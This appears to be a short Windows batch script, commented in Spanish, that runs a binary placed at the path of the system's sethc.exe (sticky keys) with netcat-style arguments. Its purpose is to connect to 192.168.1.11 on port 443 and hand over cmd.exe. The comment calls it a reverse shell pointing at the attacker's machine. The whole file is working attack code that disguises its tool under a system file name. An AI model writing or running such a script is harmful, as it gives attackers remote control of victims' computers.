@echo off
start "" /B C:\Windows\System32\sethc.exe 192.168.1.11 443 -e cmd.exe

::Reverse Shell. La IP es la IP de la máquina atacante.
